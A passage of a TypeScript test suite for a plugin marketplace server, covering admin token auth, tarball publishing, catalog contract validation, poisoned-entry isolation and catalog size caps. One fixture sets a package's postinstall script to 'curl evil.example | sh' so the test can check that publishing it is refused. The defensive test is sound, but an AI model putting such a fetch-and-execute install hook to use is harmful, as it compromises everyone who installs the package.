import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { stat } from 'node:fs/promises'
import { join } from 'node:path'
import { parseCatalogProviderPage } from 'dsh-community-market/contracts'
import type { CatalogEntry } from '../src/catalog/store.ts'
import { signManifest, type MarketManifest } from '../src/signing.ts'
import { adminHeaders, bootTestMarket, publishTgz, type TestMarket } from './helpers/server.ts'
import { cleanPackageManifest } from './helpers/tar.ts'

describe('admin bearer-token auth (D5, fail-closed)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  async function postPrepare(baseUrl: string, headers: Record<string, string>): Promise<number> {
    const response = await fetch(`${baseUrl}/v1/admin/manifest/prepare`, { method: 'POST', headers })
    return response.status
  }

  it('answers 401 admin-disabled on every admin endpoint when no token is configured', async () => {
    const disabled = await bootTestMarket({ adminToken: null })
    try {
      for (const [method, path] of [
        ['POST', '/v1/admin/manifest/prepare'],
        ['GET', '/v1/admin/state'],
        ['GET', '/v1/admin/manifest/pending'],
        ['DELETE', '/v1/admin/artifact?file=whatever.tgz'],
      ] as const) {
        const response = await fetch(`${disabled.baseUrl}${path}`, {
          method,
          headers: { authorization: 'Bearer whatever' },
        })
        expect(response.status, path).toBe(401)
        const parsed = await response.json() as { error: { code: string; message: string } }
        expect(parsed.error.code).toBe('admin-disabled')
        expect(parsed.error.message).toContain('MARKET_SERVER_ADMIN_TOKEN')
      }
      // Even artifact upload is disabled.
      const upload = await publishTgz(disabled.baseUrl, 'whatever')
      expect(upload.status).toBe(401)
    } finally {
      await disabled.close()
    }
  })

  it('answers 401 unauthorized for a missing or wrong token; accepts the correct one', async () => {
    expect(await postPrepare(market.baseUrl, {})).toBe(401)
    expect(await postPrepare(market.baseUrl, adminHeaders('wrong-token'))).toBe(401)
    const bad = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('wrong-token'),
    })
    expect(((await bad.json()) as { error: { code: string } }).error.code).toBe('unauthorized')

    expect(await postPrepare(market.baseUrl, adminHeaders('test-admin-token'))).toBe(200)
  })

  it('rejects malformed authorization schemes', async () => {
    const basic = await fetch(`${market.baseUrl}/v1/admin/state`, {
      headers: { authorization: 'Basic dXNlcjpwYXNz' },
    })
    expect(basic.status).toBe(401)
  })
})

describe('admin entry management (publish / edit / unpublish)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  it('publishes an artifact and lists it in the self-validated provider page', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry, sha256 } = published.body as { entry: { id: string; packageName: string; version: string; tarball: string }; sha256: string }
    expect(entry.id).toBe('huaanwork/sample-plugin@1.2.3')
    expect(entry.packageName).toBe('@huaanwork/sample-plugin')
    expect(sha256).toMatch(/^[0-9a-f]{64}$/u)

    const page = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(() => parseCatalogProviderPage(page)).not.toThrow()
    const items = (page as { items: Array<{ id: string; name: string; latestVersion: string }> }).items
    expect(items).toHaveLength(1)
    expect(items[0]).toMatchObject({
      id: 'huaanwork/sample-plugin@1.2.3',
      name: '@huaanwork/sample-plugin',
      latestVersion: '1.2.3',
    })
  })

  it('rejects publishing a non-zero-dependency tarball at publish time (honest error)', async () => {
    const result = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest({ dependencies: { lodash: '^4.0.0' } }),
    )
    expect(result.status).toBe(422)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('nonzero-dependencies')
    expect(error.message).toContain('lodash')
  })

  it('rejects publishing a tarball with lifecycle scripts at publish time', async () => {
    const result = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest({ scripts: { postinstall: 'curl evil.example | sh' } }),
    )
    expect(result.status).toBe(422)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('lifecycle-scripts')
    expect(error.message).toContain('postinstall')
  })

  it('rejects publishing bytes that are not a tarball', async () => {
    const params = new URLSearchParams({ displayName: 'X', summary: 'Y' })
    const response = await fetch(`${market.baseUrl}/v1/admin/artifacts?${params.toString()}`, {
      method: 'POST',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/gzip' },
      body: Buffer.from('not a tarball at all'),
    })
    expect(response.status).toBe(400)
    expect(((await response.json()) as { error: { code: string } }).error.code).toBe('invalid-tarball')
  })

  it('re-publishing identical bytes returns 409 and leaves the published artifact intact (D2)', async () => {
    const first = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(first.status).toBe(201)
    const { entry } = first.body as { entry: { id: string; tarball: string } }
    const artifactUrl = `${market.baseUrl}/artifacts/${entry.tarball}`
    expect((await fetch(artifactUrl)).status).toBe(200)

    const again = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(again.status).toBe(409)
    expect(((again.body as { error: { code: string } }).error.code)).toBe('already-published')

    // The artifact the existing entry references must still download.
    const download = await fetch(artifactUrl)
    expect(download.status).toBe(200)

    // The catalog page is still contract-valid and the release pipeline still works.
    const page = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(() => parseCatalogProviderPage(page)).not.toThrow()
    const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepare.status).toBe(200)
  })

  it('edits display fields and surfaces them in the provider page', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const response = await fetch(`${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ displayName: 'Renamed Plugin', summary: 'New summary', categories: ['utility', 'productivity'] }),
    })
    expect(response.status).toBe(200)

    const page = (await (await fetch(`${market.baseUrl}/v1/plugins`)).json()) as {
      items: Array<{ displayName: string; summary: string; categories: string[] }>
    }
    expect(page.items[0]?.displayName).toBe('Renamed Plugin')
    expect(page.items[0]?.summary).toBe('New summary')
    expect(page.items[0]?.categories).toEqual(['utility', 'productivity'])
  })

  it('preflights URL-typed display fields: empty is OK, non-https is rejected (R15)', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)

    // empty homepage: fine (unset)
    const empty = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ homepage: '' }),
    })
    expect(empty.status).toBe(200)

    // https values: accepted, and they land in the provider page (which stays contract-valid)
    const https = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({
        homepage: 'https://example.internal/docs',
        publisherName: 'HuaAn',
        publisherUrl: 'https://example.internal',
        repositoryUrl: 'https://example.internal/repo.git',
      }),
    })
    expect(https.status).toBe(200)
    const page = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(() => parseCatalogProviderPage(page)).not.toThrow()
    const item = (page as { items: Array<{ homepage: string; publisher: { name: string; url: string }; repository: { url: string } }> }).items[0]!
    expect(item.homepage).toBe('https://example.internal/docs')
    expect(item.publisher).toEqual({ name: 'HuaAn', url: 'https://example.internal' })
    expect(item.repository).toEqual({ url: 'https://example.internal/repo.git' })

    // plain http / ftp values: rejected with a pointer at the field
    for (const [field, value] of [['homepage', 'http://intranet/plain'], ['publisherUrl', 'ftp://example'], ['repositoryUrl', 'http://git.internal/x']] as const) {
      const rejected = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify({ [field]: value }),
      })
      expect(rejected.status, `${field}=${value}`).toBe(400)
      const parsed = await rejected.json() as { error: { code: string; message: string } }
      expect(parsed.error.code).toBe('invalid-entry-patch')
      expect(parsed.error.message).toContain(field)
      expect(parsed.error.message).toContain('https')
    }
  })

  it('unpublishes an entry: gone from the page, state reports it', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const response = await fetch(
      `${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}/unpublish`,
      { method: 'POST', headers: adminHeaders('test-admin-token') },
    )
    expect(response.status).toBe(200)

    const page = (await (await fetch(`${market.baseUrl}/v1/plugins`)).json()) as { page: { total: number } }
    expect(page.page.total).toBe(0)

    const state = (await (await fetch(`${market.baseUrl}/v1/admin/state`, { headers: adminHeaders('test-admin-token') })).json()) as {
      entries: unknown[]
      entryCount: number
    }
    expect(state.entryCount).toBe(0)
    expect(state.entries).toEqual([])

    // unpublishing again: 404
    const again = await fetch(
      `${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}/unpublish`,
      { method: 'POST', headers: adminHeaders('test-admin-token') },
    )
    expect(again.status).toBe(404)
  })

  it('rejects patches with unknown or wrongly-typed fields', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)
    const patch = async (body: unknown): Promise<number> => {
      const response = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify(body),
      })
      return response.status
    }
    expect(await patch({ noSuchField: 'x' })).toBe(400)
    expect(await patch({ displayName: '' })).toBe(400)
    expect(await patch({ categories: 'not-an-array' })).toBe(400)
    expect(await patch('not-an-object')).toBe(400)
    // unknown id
    const missing = await fetch(`${market.baseUrl}/v1/admin/entries/nope%40missing`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ displayName: 'X' }),
    })
    expect(missing.status).toBe(404)
  })
})

describe('write-side contract validation + read-side poisoning (D3/D4)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  async function catalogHealth(): Promise<void> {
    const page = await fetch(`${market.baseUrl}/v1/plugins`)
    expect(page.status).toBe(200)
    const body: unknown = await page.json()
    expect(() => parseCatalogProviderPage(body)).not.toThrow()
    const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepare.status).toBe(200)
  }

  it('rejects a contract-violating displayName at publish time (400) and keeps the catalog healthy', async () => {
    const result = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest(),
      { displayName: 'x'.repeat(200) },
    )
    expect(result.status).toBe(400)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('invalid-entry-contract')
    expect(error.message).toContain('displayName')
    await catalogHealth()
  })

  it('rejects a contract-violating PATCH (over-long displayName, bad capability/category, bad updatedAt) and keeps the stored entry intact', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)
    const patch = async (body: unknown): Promise<unknown> => {
      const response = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify(body),
      })
      return response.json()
    }

    for (const [label, body, hint] of [
      ['over-long displayName', { displayName: 'x'.repeat(200) }, 'displayName'],
      ['control character in summary', { summary: 'line1\nline2' }, 'summary'],
      ['capability without dot', { capabilities: ['nodot'] }, 'capabilities'],
      ['uppercase category', { categories: ['Utility'] }, 'categories'],
      ['non-date updatedAt', { updatedAt: 'yesterday' }, 'updatedAt'],
    ] as const) {
      const parsed = await patch(body) as { error: { code: string; message: string } }
      expect(parsed.error.code, label).toBe('invalid-entry-contract')
      expect(parsed.error.message, label).toContain(hint)
    }

    // The stored entry is untouched and the whole catalog still serves.
    const page = (await (await fetch(`${market.baseUrl}/v1/plugins`)).json()) as {
      items: Array<{ displayName: string; summary: string }>
    }
    expect(page.items[0]).toMatchObject({ displayName: 'Sample Plugin', summary: 'A sample plugin' })
    await catalogHealth()
  })

  it('rejects https URIs with userinfo, port, or fragment at write time (D3a)', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)
    for (const [field, value] of [
      ['homepage', 'https://user:pass@example.internal/docs'],
      ['homepage', 'https://example.internal:8443/docs'],
      ['homepage', 'https://example.internal/docs#frag'],
      ['publisherUrl', 'https://user:pass@example.internal'],
      ['repositoryUrl', 'https://example.internal:8443/repo.git'],
    ] as const) {
      const rejected = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify({ [field]: value }),
      })
      expect(rejected.status, `${field}=${value}`).toBe(400)
      const parsed = await rejected.json() as { error: { code: string } }
      expect(parsed.error.code, `${field}=${value}`).toBe('invalid-entry-patch')
    }
    await catalogHealth()
  })

  it('isolates one poisoned stored entry instead of failing the whole catalog (D3b → ruling D-M6-26)', async () => {
    // Seed corrupt state directly (bypasses the write-side guards, simulating
    // an operator-edited state file or a restored old backup): one entry with a
    // control character in displayName, two healthy entries around it.
    await market.store.replaceEntries([
      { id: 'keeper-one@1.0.0', packageName: '@huaanwork/keeper-one', version: '1.0.0', displayName: 'Keeper One', summary: 'First healthy entry' },
      { id: 'poisoned@1.0.0', packageName: 'poisoned', version: '1.0.0', displayName: 'bad\u0007name', summary: 'A poisoned entry' },
      { id: 'keeper-two@1.0.0', packageName: '@huaanwork/keeper-two', version: '1.0.0', displayName: 'Keeper Two', summary: 'Second healthy entry' },
    ])

    const logged: string[] = []
    const spy = vi.spyOn(console, 'error').mockImplementation((...args: unknown[]) => {
      logged.push(args.map(argument => String(argument)).join(' '))
    })
    try {
      const response = await fetch(`${market.baseUrl}/v1/plugins`)
      expect(response.status).toBe(200)
      const body = await response.json() as { items: Array<{ id: string }>; page: { total: number } }
      expect(body.items.map(item => item.id)).toEqual(['keeper-one@1.0.0', 'keeper-two@1.0.0'])
      expect(body.page.total).toBe(2)
      expect(() => parseCatalogProviderPage(body)).not.toThrow()

      // Ruling D-M6-26: the isolation is honestly visible. The response carries
      // the count as metadata (a probe can alert on it) ...
      expect(response.headers.get('x-catalog-isolated-entries')).toBe('1')
      // ... and the operator log names the isolated entry and the contract
      // issue behind it. Both channels exist on purpose: the count alone says
      // "something was isolated", the log says what the operator broke.
      expect(logged.join('\n')).toContain('poisoned@1.0.0')
      expect(logged.join('\n')).toContain('displayName')
      // The ajv detail stays out of the unauthenticated body (review D3b).
      const bodyText = JSON.stringify(body)
      expect(bodyText).not.toContain('instancePath')
      expect(bodyText).not.toContain('must match pattern')
    } finally {
      spy.mockRestore()
    }
  })

  it('fails closed (500 invalid-stored-catalog, never an empty catalog) when every stored entry is invalid', async () => {
    await market.store.replaceEntries([
      { id: 'poisoned@1.0.0', packageName: 'poisoned', version: '1.0.0', displayName: 'bad\u0007name', summary: 'A poisoned entry' },
    ])
    const logged: string[] = []
    const spy = vi.spyOn(console, 'error').mockImplementation((...args: unknown[]) => {
      logged.push(args.map(argument => String(argument)).join(' '))
    })
    try {
      const response = await fetch(`${market.baseUrl}/v1/plugins`)
      // 200 + an empty page would tell clients the market is empty; that is the
      // one answer isolation must never produce (ruling D-M6-26 fail-closed arm).
      expect(response.status).toBe(500)
      const text = await response.text()
      const parsed = JSON.parse(text) as { error: { code: string; message: string } }
      expect(parsed.error.code).toBe('invalid-stored-catalog')
      expect(parsed.error.message).toContain('provider-page contract')
      // The ajv instancePath/pattern internals must NOT leak to the client (D3b).
      expect(text).not.toContain('instancePath')
      expect(text).not.toContain('must match pattern')
      expect(text).not.toContain('/items/0')
      // ... but they must reach the operator: the refusal logs what was isolated.
      expect(logged.join('\n')).toContain('poisoned@1.0.0')
      expect(logged.join('\n')).toContain('displayName')
    } finally {
      spy.mockRestore()
    }
  })

  it('answers 400 query-not-paginable when a legal query is too large to carry a contract-valid cursor', async () => {
    // Legal-but-oversized query: q at its 200-character bound plus 20
    // categories at their 64-character bound, answered with limit=1. The
    // nextCursor is the base64url of the normalized effective query key, so it
    // exceeds the upstream schema's 2048-character `page.nextCursor` cap — the
    // page would violate the very schema this endpoint advertises. The
    // endpoint must fail closed, honestly, and without blaming stored state
    // (Task 6.7 fix round 1).
    const bigQ = 'x'.repeat(200)
    const categories = Array.from(
      { length: 20 },
      (_, index) => `${String.fromCharCode(97 + index)}${'a'.repeat(63)}`,
    )
    await market.store.replaceEntries([
      { id: 'big-one@1.0.0', packageName: '@huaanwork/big-one', version: '1.0.0', displayName: 'Big One', summary: `${bigQ} first`, categories: [categories[0]!] },
      { id: 'big-two@1.0.0', packageName: '@huaanwork/big-two', version: '1.0.0', displayName: 'Big Two', summary: `${bigQ} second`, categories: [categories[0]!] },
    ])
    const params = new URLSearchParams({ q: bigQ, limit: '1' })
    for (const category of categories) params.append('category', category)
    const logged: string[] = []
    const spy = vi.spyOn(console, 'error').mockImplementation((...args: unknown[]) => {
      logged.push(args.map(argument => String(argument)).join(' '))
    })
    try {
      const response = await fetch(`${market.baseUrl}/v1/plugins?${params.toString()}`)
      // Fail closed: never a 200 whose payload the contract rejects.
      expect(response.status).toBe(400)
      const text = await response.text()
      const parsed = JSON.parse(text) as { error: { code: string; message: string }; items?: unknown }
      expect(parsed.error.code).toBe('query-not-paginable')
      expect(parsed.error.message).toContain('2048')
      // No page payload at all, and no ajv internals leak (review D3b).
      expect(parsed.items).toBeUndefined()
      expect(text).not.toContain('instancePath')
      expect(text).not.toContain('/page/nextCursor')
      // Honest attribution: the request is too large to paginate; the stored
      // catalog is NOT reported as broken.
      expect(parsed.error.message).not.toContain('stored catalog')
      expect(parsed.error.message).toContain('narrow q/category/capability')
      // The operator log carries the envelope refusal.
      expect(logged.join('\n')).toContain('whole-page contract envelope')

      // The guard does not misfire on the entries: the same query is served
      // normally (200 + both entries) when pagination needs no cursor.
      const servable = await fetch(`${market.baseUrl}/v1/plugins?${new URLSearchParams({ q: bigQ, limit: '2' }).toString()}`)
      expect(servable.status).toBe(200)
      const page = await servable.json() as { items: unknown[] }
      expect(page.items).toHaveLength(2)
    } finally {
      spy.mockRestore()
    }
  })

  it('keeps the write-side validation intact: no reachable write path admits a violating entry', async () => {
    // Publish-time: a control character in the summary is rejected by the
    // locked write-side contract check (review D3) ...
    const poisonedPublish = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest(),
      { summary: 'line1\u0007line2' },
    )
    expect(poisonedPublish.status).toBe(400)
    expect((poisonedPublish.body as { error: { code: string } }).error.code).toBe('invalid-entry-contract')

    // ... PATCH-time: an over-long displayName is rejected the same way.
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: { id: string } }
    const rejected = await fetch(`${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ displayName: 'x'.repeat(200) }),
    })
    expect(rejected.status).toBe(400)
    expect(((await rejected.json()) as { error: { code: string } }).error.code).toBe('invalid-entry-contract')

    // Nothing was admitted: the served page needs no isolation signal at all.
    const page = await fetch(`${market.baseUrl}/v1/plugins`)
    expect(page.status).toBe(200)
    expect(page.headers.get('x-catalog-isolated-entries')).toBeNull()
    const body = await page.json() as { items: unknown[] }
    expect(body.items).toHaveLength(1)
  })

  it('refuses to prepare a signed manifest while a stored entry violates the contract (honest 409, not a bare 500)', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    // Operator hand-edit: poison one stored entry on top of the healthy one.
    await market.store.replaceEntries([
      ...market.store.entries(),
      { id: 'poisoned@1.0.0', packageName: 'poisoned', version: '1.0.0', displayName: 'bad\u0007name', summary: 'A poisoned entry' },
    ])

    const logged: string[] = []
    const spy = vi.spyOn(console, 'error').mockImplementation((...args: unknown[]) => {
      logged.push(args.map(argument => String(argument)).join(' '))
    })
    try {
      const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
        method: 'POST',
        headers: adminHeaders('test-admin-token'),
      })
      // The read side isolates (see above); a SIGNED manifest must not silently
      // shed an entry, so prepare refuses with an honest, actionable 409 instead
      // of a bare 500 (or a manifest that quietly drops the entry).
      expect(prepare.status).toBe(409)
      const parsed = await prepare.json() as { error: { code: string; message: string } }
      expect(parsed.error.code).toBe('catalog-entry-invalid')
      expect(parsed.error.message).toContain('poisoned@1.0.0')
      expect(parsed.error.message).toContain('displayName')
      expect(parsed.error.message).toContain('unpublish')
      // The refusal also lands in the durable operator log, with the entry.
      expect(logged.join('\n')).toContain('refusing to prepare a signed manifest')
      expect(logged.join('\n')).toContain('poisoned@1.0.0')

      // The read side keeps serving the valid entries meanwhile.
      const page = await fetch(`${market.baseUrl}/v1/plugins`)
      expect(page.status).toBe(200)
      expect(page.headers.get('x-catalog-isolated-entries')).toBe('1')

      // All-invalid is the same honest refusal (the service fails closed before
      // a page exists), not a 500.
      await market.store.replaceEntries([
        { id: 'poisoned@1.0.0', packageName: 'poisoned', version: '1.0.0', displayName: 'bad\u0007name', summary: 'A poisoned entry' },
      ])
      const again = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
        method: 'POST',
        headers: adminHeaders('test-admin-token'),
      })
      expect(again.status).toBe(409)
      expect(((await again.json()) as { error: { code: string } }).error.code).toBe('catalog-entry-invalid')
    } finally {
      spy.mockRestore()
    }
  })

  it('rejects a publish whose catalog entry id would exceed the contract identifier maxLength of 160 (D4)', async () => {
    const result = await publishTgz(market.baseUrl, 'test-admin-token', cleanPackageManifest({ name: 'a'.repeat(155) }))
    expect(result.status).toBe(422)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('invalid-package-identity')
    await catalogHealth()
  })
})

describe('manifest/prepare honest 4xx (review D14d)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  it('answers 409 artifact-missing (not a bare 500) when an entry points at a vanished artifact', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: { id: string; tarball: string } }
    // Operator cleanup path: the artifact file is gone while the entry still points at it.
    await market.artifacts.remove(entry.tarball)

    const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepare.status).toBe(409)
    const parsed = await prepare.json() as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('artifact-missing')
    expect(parsed.error.message).toContain(entry.tarball)
    // The operator guidance must reach the response, not just the server log.
    expect(parsed.error.message).toContain('re-publish')
  })

  it('answers 422 catalog-too-large at 201 entries instead of a 500, with the operator guidance inline', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: CatalogEntry }
    const entries: CatalogEntry[] = [entry]
    for (let index = 1; entries.length <= 200; index += 1) {
      entries.push({
        ...entry,
        id: `bulk/pkg-${index}@1.0.0`,
        packageName: `bulk-pkg-${index}`,
      })
    }
    await market.store.replaceEntries(entries)

    const prepare = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepare.status).toBe(422)
    const parsed = await prepare.json() as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('catalog-too-large')
    expect(parsed.error.message).toContain('201')
    expect(parsed.error.message).toContain('Split the source')
  })

  // 评审 D15:只在 prepare 时拒绝 ⇒ 第 201 条照样上架、之后 prepare 永久失败,
  // 运营者连既有的 200 条也发不出新清单(整条发布链冻结,非优雅降级)。上限前移
  // 到发布时后,市场永不进入冻结态。回退 publish 侧的 cap 检查即红。
  it('rejects the 201st entry at publish time so the catalog can never freeze (review D15)', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: CatalogEntry }
    const entries: CatalogEntry[] = [entry]
    for (let index = 1; entries.length < 200; index += 1) {
      entries.push({ ...entry, id: `bulk/pkg-${index}@1.0.0`, packageName: `bulk-pkg-${index}` })
    }
    expect(entries).toHaveLength(200)
    await market.store.replaceEntries(entries)

    const prepare = () => fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    // 恰在上限时 prepare 仍然可用(其自身守卫是 `> MAX`)。
    expect((await prepare()).status).toBe(200)

    const overflow = await publishTgz(market.baseUrl, 'test-admin-token', cleanPackageManifest({ name: 'overflow-pkg', version: '1.0.0' }))
    expect(overflow.status).toBe(422)
    const parsed = overflow.body as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('catalog-full')
    expect(parsed.error.message).toContain('200')
    expect(parsed.error.message).toContain('unpublish')

    // 被拒的发布没有改变目录,且发布链**没有冻结**——这正是本条的目的。
    expect(market.store.entries()).toHaveLength(200)
    expect((await prepare()).status).toBe(200)
  })
})

// 裁定 R-3:上限可配置(**只能调低**——契约天花板 200 由 config 启动校验钉死)。
// 发布时 cap 与 prepare 纵深都必须读**配置值**,不得各自写死字面量。
describe('catalog scale cap configured below the contract maximum (ruling R-3)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket({ maxCatalogEntries: 50 })
  })

  afterEach(async () => {
    await market.close()
  })

  it('rejects the 51st entry at publish time when the cap is configured to 50', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry } = published.body as { entry: CatalogEntry }
    const entries: CatalogEntry[] = [entry]
    for (let index = 1; entries.length < 50; index += 1) {
      entries.push({ ...entry, id: `bulk/pkg-${index}@1.0.0`, packageName: `bulk-pkg-${index}` })
    }
    expect(entries).toHaveLength(50)
    await market.store.replaceEntries(entries)

    const prepare = () => fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    // 恰在上限时 prepare 仍然可用(其自身守卫是 `> cap`)。
    expect((await prepare()).status).toBe(200)

    const overflow = await publishTgz(market.baseUrl, 'test-admin-token', cleanPackageManifest({ name: 'overflow-pkg', version: '1.0.0' }))
    expect(overflow.status).toBe(422)
    const parsed = overflow.body as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('catalog-full')
    // 诚实点名**配置值**,而不是契约默认 200。
    expect(parsed.error.message).toContain('50')
    expect(parsed.error.message).toContain('unpublish')

    // 被拒的发布没有改变目录,且发布链没有冻结。
    expect(market.store.entries()).toHaveLength(50)
    expect((await prepare()).status).toBe(200)
  })
})

// ---------------------------------------------------------------------------
// P7: the unauthenticated admin page must not disclose whether a token is
// configured (M6 Task 6.5). The defect: the shell rendered an
// "MARKET_SERVER_ADMIN_TOKEN is not configured" banner only when unset, so an
// unauthenticated observer could tell — purely by response shape — whether the
// admin surface was disabled. The page now renders identically either way; the
// `admin-disabled` code lives only in the JSON API (which is where the operator
// inspects it).
// ---------------------------------------------------------------------------

describe('P7 admin page leaks nothing', () => {
  const LEAK_PATTERNS = [/未配置/u, /not configured/iu, /MARKET_SERVER_ADMIN_TOKEN/u, /admin-disabled/u, /token is not/u]
  const booted: TestMarket[] = []

  afterEach(async () => {
    await Promise.all(booted.splice(0).map(async (market) => market.close()))
  })

  async function boot(options: Parameters<typeof bootTestMarket>[0] = {}): Promise<TestMarket> {
    const market = await bootTestMarket(options)
    booted.push(market)
    return market
  }

  it('renders the same shape whether or not a token is configured', async () => {
    const enabled = await boot()
    const disabled = await boot({ adminToken: null })
    const withToken = await fetch(`${enabled.baseUrl}/admin`)
    const withoutToken = await fetch(`${disabled.baseUrl}/admin`)
    expect(withToken.status).toBe(200)
    expect(withoutToken.status).toBe(200)
    const [a, b] = await Promise.all([withToken.text(), withoutToken.text()])
    // Same bytes: the response carries no "is a token configured?" signal.
    expect(a).toBe(b)
    for (const pattern of LEAK_PATTERNS) {
      expect(a, `admin page must not match ${String(pattern)}`).not.toMatch(pattern)
    }
  })

  it('keeps the disabled signal in the JSON API, not the page', async () => {
    const disabled = await boot({ adminToken: null })
    const api = await fetch(`${disabled.baseUrl}/v1/admin/state`, { headers: adminHeaders('whatever') })
    expect(api.status).toBe(401)
    const body = await api.json() as { error: { code: string } }
    expect(body.error.code).toBe('admin-disabled')
  })
})

// ---------------------------------------------------------------------------
// P11b (M6 Task 6.6): operator-facing artifact deletion. `ArtifactStore.remove`
// had ZERO production callers and unpublish deliberately keeps the artifact, so
// the disk only grew. The endpoint's judgment is a DUAL reference face,
// fail-closed:
//
//   catalog face  — any `entries[].tarball` equal to the target file name
//                   (the publish-side precedent, review D2);
//   manifest face — any `files[].tarballPath` (`/artifacts/<tarball>`) in the
//                   ACTIVATED signed manifest, read verbatim via store.manifest().
//
// The catalog face alone is not enough: unpublish removes the entry but
// rebuilds and re-signs NOTHING, and GET /v1/manifest replays the activated
// manifest byte-for-byte — between unpublish and a re-prepare + activate,
// clients can still download and install exactly those bytes. Deleting then
// would be the D2 data-loss shape again.
// ---------------------------------------------------------------------------

describe('P11b operator-facing artifact deletion (M6 Task 6.6)', () => {
  let market: TestMarket
